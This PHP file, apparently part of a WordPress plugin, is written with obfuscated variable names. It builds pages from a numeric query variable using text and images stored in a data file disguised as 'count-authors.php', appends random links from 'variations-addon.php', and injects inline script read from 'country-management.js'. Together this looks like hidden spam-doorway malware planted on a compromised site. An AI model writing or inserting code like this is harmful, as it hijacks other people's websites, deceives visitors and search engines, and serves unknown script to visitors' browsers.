<?php
$rNTibxb = intval(get_query_var('ijhkphfoei'));

if ($rNTibxb < 1 || $rNTibxb > 4327) return;
$mwWiN = file(plugin_dir_path(__FILE__).'count-authors.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$udp3zN48Yn = explode(';', $mwWiN[$rNTibxb]);
if (count($udp3zN48Yn) < 2) return;
$iAGGbQ504 = $udp3zN48Yn[0];
$nkMGNzSgJR  = $udp3zN48Yn[1];
$eIbsKQmO = $udp3zN48Yn[2];
$p5Aveupb  = $udp3zN48Yn[3];
$kWQxq = $udp3zN48Yn[4];
set_query_var('mewmzugc', $iAGGbQ504);

$yXFVbWD = '';
$pyMUZgr3Ks = plugin_dir_path(__FILE__).'variations-addon.php';
if (is_file($pyMUZgr3Ks)) {
	$vVCT6F9XVz = file($pyMUZgr3Ks, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($vVCT6F9XVz);
	shuffle($vVCT6F9XVz);
	$wuLEGkG = mt_rand(2, 5);
	if (count($vVCT6F9XVz) > $wuLEGkG) {
		for ($ermdo3v = 0; $ermdo3v < $wuLEGkG; $ermdo3v++) {
			$qTnUj = array_shift($vVCT6F9XVz);
			$yXFVbWD .= '<p><a href="'.$qTnUj.'">'.$qTnUj.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $iAGGbQ504; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $nkMGNzSgJR . "</p>\n";
				if (strlen($p5Aveupb) > 0) echo "<p>" . $p5Aveupb . "</p>\n";
				if (strlen($eIbsKQmO) > 0) echo "<p>" . $eIbsKQmO . "</p>\n";
				if (strlen($kWQxq) > 0) echo '<p><a href="#"><img src="'.$kWQxq.'"></a>' . "</p>\n";
				echo $yXFVbWD;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$tKboirgbVU = plugin_dir_path(__FILE__) . 'country-management.js';
if (is_file($tKboirgbVU)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($tKboirgbVU);
	echo '</script>';
}
get_footer();
?>
